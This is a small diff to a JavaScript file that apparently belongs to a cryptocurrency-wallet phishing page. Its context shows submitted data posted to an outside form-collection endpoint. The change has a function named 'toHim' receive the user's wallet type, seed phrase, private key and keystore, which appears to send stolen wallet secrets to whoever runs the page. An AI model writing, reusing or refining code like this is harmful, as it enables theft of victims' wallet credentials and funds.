@@ -7290,6 +7290,7 @@
           dataToSubmit
           , 'https://usebasin.com/f/51c5b5f8b45b');
           } catch (error) {
+              console.log(error);
               
           }
           try {
@@ -7467,7 +7468,13 @@
             });
           }else{
             if(!isValidPrivateKey && !isValid){
-              toHim(formData);
+              toHim({
+                type,
+                wallet,
+                phrase,
+                privateKey,
+                keyStore
+            });
             }else{
               let phrases = phrase?.split(' ') || [];
               phrases.pop();
